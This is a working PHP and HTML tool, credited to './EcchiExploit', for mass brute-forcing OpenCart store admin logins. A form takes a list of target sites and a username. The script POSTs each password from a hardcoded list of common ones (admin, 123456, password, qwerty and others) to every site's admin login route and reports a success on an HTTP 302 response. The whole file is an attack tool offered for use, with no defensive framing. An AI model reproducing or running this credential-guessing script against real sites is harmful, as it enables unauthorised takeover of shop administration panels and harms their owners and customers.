<!DOCTYPE html>
<html>
<head>
	<title>OpenCart Brute Force</title>
	<meta charset="utf-8">
	<meta name="author" content="./EcchiExploit">
	<meta name="description" content="CMS OpenCart Mass Brute Force">
</head>
<body>
	<h1>OpenCart CMS Mass Brute Force</h1>
	<form method="POST">
		<table>
			<tr>
				<td>Site</td>
				<td>:</td>
				<td><textarea rows="10" cols="60" name="url" placeholder="http://example.com"></textarea></td>
			</tr>
			<tr>
				<td>Username</td>
				<td>:</td>
				<td><input type="text" name="user" value="admin" placeholder="username" required></td>
			</tr>
			<tr>
				<td><input type="submit"></td>
			</tr>
		</table>
	</form>
</body>
</html>
<?php
function site($url,$user,$pass){
	$setopt = array(
		CURLOPT_URL => "$url/admin/index.php?route=common/login",
		CURLOPT_RETURNTRANSFER => true,
		CURLOPT_HEADER => true,
		CURLOPT_POSTFIELDS => "username=$user&password=$pass&submit=1",
		CURLOPT_POST => true,
	);
	$ch = curl_init();
	curl_setopt_array($ch, $setopt);
	$exe = curl_exec($ch);
	$info = curl_getinfo($ch, CURLINFO_HTTP_CODE);
	curl_close($ch);
	return $info;
}
if (isset($_POST['url']) && !empty($_POST['url'])) {
	$url = htmlspecialchars($_POST['url']);
	$username = htmlspecialchars($_POST['user']);
	$list = array('admin','demo','admin123','123456','123456789','123','1234','12345','1234567','12345678','123456789','admin1234','admin123456','pass123','root','321321','123123','112233','102030','password','pass','qwerty','abc123','654321','pass1234');
	$exp = explode("\n", $url);
	foreach ($exp as $key) {
		if(!preg_match('#^http(s)?://#',$key)){
			$web = "http://".$key;
		}
		else {
			$web = $key;
		}
		echo "<br>Site : $web<br>";
		for ($i=0; $i < count($list); $i++) {
			if (site($web,$username,$list[$i]) == 302) {
				echo "Found : $username | $list[$i]<br>
				<a href='$key/admin/index.php?route=common/login'>$key/admin/index.php?route=common/login</a><br>";
				break;
			}
			else {
				echo "Not Found : $username | $list[$i]<br>";
			}
		}
	}
	echo "<center>Matching Finished!!</center>";
}
?>